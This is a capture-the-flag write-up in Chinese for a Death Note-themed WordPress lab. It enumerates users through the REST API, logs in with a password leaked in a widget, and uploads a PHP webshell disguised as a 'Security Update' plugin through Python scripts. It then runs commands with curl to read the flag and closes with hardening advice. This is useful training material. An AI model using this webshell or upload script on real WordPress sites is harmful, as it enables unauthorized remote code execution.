---
title: '死亡笔记 - WordPress 渗透靶场 Writeup'
date: '2026-05-30'
modifiedTime: '2026-05-30'
intro: '时间正在流逝，"基拉"的指尖已然触碰到那个决定命运的名字——L！世界的天平即将倾覆，而你，是我们唯一的底牌！这不是演习，而是一场在二进制世界中进行的终极对决！你的键盘就是你的武器，你的智慧将穿透层层加密的壁垒，直面"死神之眼"的凝视！攻破它'
tags: ['ctf', 'writeup', 'cve', 'rce', '文件上传', 'php', 'wordpress', 'python', '命令注入']
cover: ''
---

# 死亡笔记 - WordPress 渗透靶场 Writeup

## 题目描述

> 时间正在流逝，"基拉"的指尖已然触碰到那个决定命运的名字——L！世界的天平即将倾覆，而你，是我们唯一的底牌！这不是演习，而是一场在二进制世界中进行的终极对决！你的键盘就是你的武器，你的智慧将穿透层层加密的壁垒，直面"死神之眼"的凝视！攻破它！撕裂系统的防御，在最后的倒计时归零前，将L从死亡笔记上彻底抹去！

**目标信息：**
- `mnw45kf.haobachang.loveli.com.cn:48299` (SSH)
- `4tvnaca.haobachang.loveli.com.cn:48864` (HTTP)

**Flag 位置：** `/tmp/flag.txt`

---

## 攻击链总览

```
robots.txt 信息泄露 → /important.jpg 获取线索 → WordPress REST API 用户枚举 
→ Widget 泄露密码 → kira:iamjustic3 登录后台 → 恶意插件上传 → RCE → cat /tmp/flag.txt
```

---

## 一、信息收集

### 1.1 端口扫描

```bash
nmap -sV -p 48299 mnw45kf.haobachang.loveli.com.cn
# 48299/tcp → OpenSSH 7.9p1 Debian

nmap -sV -p 48864 4tvnaca.haobachang.loveli.com.cn
# 48864/tcp → Apache httpd 2.4.38 (Debian)
```

两个目标解析到同一 IP `139.155.75.159`。SSH 端口暂时放一边，先攻 HTTP。

### 1.2 路径探测

访问首页 → 302 重定向到 `./wordpress`，确认为 WordPress 站点。

`robots.txt` 直接泄露关键线索：

```
fuck it my dad
added hint on /important.jpg

ryuk please delete it
```

**解读：** 这是夜神总一郎（Soichiro Yagami，夜神月的父亲）留下的信，其中 "ryuk" 是死亡笔记中的死神流克。

### 1.3 /important.jpg 线索

```
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself
but i think it is in the hint section of site
```

**关键信息：**
- 登录用户名在 `user.txt` 文件中
- 密码在网站的 "hint section"

### 1.4 WordPress REST API 枚举

```bash
curl "http://4tvnaca.haobachang.loveli.com.cn:48864/wordpress/index.php/wp-json/wp/v2/users"
```

返回用户信息：
- **用户名：`kira`**（slug）
- 显示名：`kira`
- URL：`http://deathnote.vuln/wordpress`

```bash
curl "http://.../wp-json/wp/v2/pages"
```

返回 HINT 页面（slug: `hint`, page_id: 34）：

> "Find a notes.txt file on server or SEE the L comment"

同时 WordPress 首页 Widget 泄露了关键信息：

```html
<h2 class="widget-title">my fav line is iamjustic3</h2>
```

这是一个用户名为 "L" 的评论者留下的。REST API 查询评论确认 L 的评论存在但内容为空——真正的密码就藏在 Widget 里。

---

## 二、漏洞分析

### 2.1 漏洞类型：信息泄露 + 弱口令

| 环节 | 漏洞 | 说明 |
|------|------|------|
| robots.txt | 敏感路径暴露 | 直接泄露 `/important.jpg` 线索路径 |
| WordPress REST API | 用户枚举 | `/wp-json/wp/v2/users` 未禁用，直接暴露用户名 `kira` |
| Widget 区域 | 密码泄露 | 侧边栏 Widget 明文显示密码 `iamjustic3` |
| 后端管理 | 插件上传未限制 | admin 用户可直接上传任意 ZIP 插件 |

### 2.2 WordPress 版本

实际运行版本为 **WordPress 6.9.4**（从 admin 页面的 `load-styles.php?ver=6.9.4` 确认）。

虽然版本较新，但 **已获得管理员权限** 使得版本号不再重要——管理员可以直接上传恶意插件实现 RCE。

---

## 三、利用过程

### 3.1 WordPress 登录

```python
import urllib.request, urllib.parse, http.cookiejar

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

BASE = "http://4tvnaca.haobachang.loveli.com.cn:48864/wordpress"

data = urllib.parse.urlencode({
    "log": "kira",
    "pwd": "iamjustic3",
    "wp-submit": "Log In",
    "redirect_to": BASE + "/wp-admin/",
    "testcookie": "1"
}).encode()

opener.open(urllib.request.Request(BASE + "/wp-login.php", data=data))
```

✅ 登录成功，获得 `wordpress_logged_in` cookie。

### 3.2 获取 Plugin Upload Nonce

```python
req = urllib.request.Request(BASE + "/wp-admin/plugin-install.php?tab=upload")
resp = opener.open(req, timeout=10)
body = resp.read().decode()

import re
nonce = re.search(r'name="_wpnonce" value="([^"]+)"', body).group(1)
```

### 3.3 创建恶意插件

```python
import io, zipfile

plugin_code = b'''<?php
/*
Plugin Name: Security Update
Version: 1.0
*/
if(isset($_GET["c"])){system($_GET["c"]);die();}
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('shell.php', plugin_code)
zip_data = buf.getvalue()
```

### 3.4 上传插件并激活

```python
import os

boundary = "----WebKitFormBoundary" + os.urandom(16).hex()
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="_wpnonce"\r\n\r\n{nonce}\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"\r\n'
    f"Content-Type: application/zip\r\n\r\n"
).encode() + zip_data + f"\r\n--{boundary}--\r\n".encode()

req = urllib.request.Request(
    BASE + "/wp-admin/update.php?action=upload-plugin",
    data=body,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
)
opener.open(req, timeout=10)
```

### 3.5 RCE - 获取 Flag

```bash
curl "http://4tvnaca.haobachang.loveli.com.cn:48864/wordpress/wp-content/plugins/shell/shell.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://.../shell.php?c=cat%20/tmp/flag.txt"
```

---

## 四、Flag

```
flag{8c25d507-d11d-4bca-9a5f-cff1ba81d603}
```

---

## 五、总结

### 攻击路径

```
robots.txt
    ↓
/important.jpg (夜神总一郎的信)
    ↓
WordPress REST API (/wp-json/wp/v2/users)  → 用户名 kira
    ↓
Widget "my fav line is iamjustic3"         → 密码 iamjustic3
    ↓
WordPress Admin 登录
    ↓
Plugin Upload → ZIP webshell
    ↓
RCE: cat /tmp/flag.txt
```

### 关键技巧

1. **REST API 用户枚举**：WordPress 默认开启 REST API，`/wp-json/wp/v2/users` 可直接获取用户名列表
2. **Widget 信息泄露**：密码被硬编码在侧边栏 Widget 中，而非更隐蔽的位置
3. **Plugin Upload RCE**：获得 admin 权限后，WordPress 允许直接上传 ZIP 格式的插件，这是最可靠的 RCE 路径——比编辑主题文件更隐蔽且不会被主题更新覆盖

### 题目与现实映射

| 死亡笔记元素 | CTF 对应 |
|-------------|---------|
| 基拉 (Kira) | WordPress 用户名 `kira` |
| L | 评论者 Widget，显示密码线索 |
| 夜神总一郎 | `/important.jpg` 的留言者 |
| 流克 (Ryuk) | robots.txt 中的 "ryuk please delete it" |
| 死亡笔记 | 被攻破的 WordPress 系统 |

### 防御建议

- **禁用或限制 WordPress REST API 用户端点**
- **不要将密码硬编码在 Widget、评论或前端代码中**
- **限制管理员可执行的操作**——考虑禁用插件/主题文件编辑（`DISALLOW_FILE_EDIT` 和 `DISALLOW_FILE_MODS`）
- **robots.txt 不应包含敏感信息**——它本质上是对爬虫的建议，不是安全控制
